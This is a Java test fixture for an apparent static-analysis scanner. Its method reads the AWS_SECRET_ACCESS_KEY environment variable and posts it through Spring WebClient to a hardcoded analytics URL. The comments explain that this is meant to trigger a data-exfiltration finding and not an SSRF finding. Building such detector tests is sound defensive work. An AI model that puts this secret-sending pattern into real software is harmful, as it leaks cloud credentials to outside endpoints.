// DATA_EXFIL fixture: Spring WebClient.  A Sensitive source (env var)
// flows through `.bodyValue(payload)` on a fixed-URL chain.  SSRF must
// NOT fire (URL is hardcoded) and `Cap::DATA_EXFIL` must fire at the
// body-binding step, since the bare-name `bodyValue` matcher hits
// independent of receiver type.
//
// Driven by `data_exfil_java_integration_tests.rs`.
import org.springframework.web.reactive.function.client.WebClient;

public class DataExfilWebClient {
    public void leak() {
        String secret = System.getenv("AWS_SECRET_ACCESS_KEY");
        WebClient webClient = WebClient.create();
        webClient.post()
            .uri("https://analytics.internal/track")
            .bodyValue(secret)
            .retrieve()
            .bodyToMono(String.class);
    }
}
